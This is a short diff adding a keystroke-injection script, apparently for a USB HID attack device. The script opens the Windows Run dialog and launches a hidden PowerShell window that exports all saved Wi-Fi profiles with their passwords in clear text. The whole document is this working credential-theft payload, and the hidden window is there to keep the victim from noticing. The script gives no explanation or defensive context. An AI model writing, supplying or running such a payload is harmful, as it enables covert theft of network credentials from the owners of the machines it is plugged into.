@@ -1,0 +1,4 @@
+DELAY 500
+GUI r
+STRING powershell -windowstyle hidden -command "netsh wlan export profile key=clear"
+ENTER
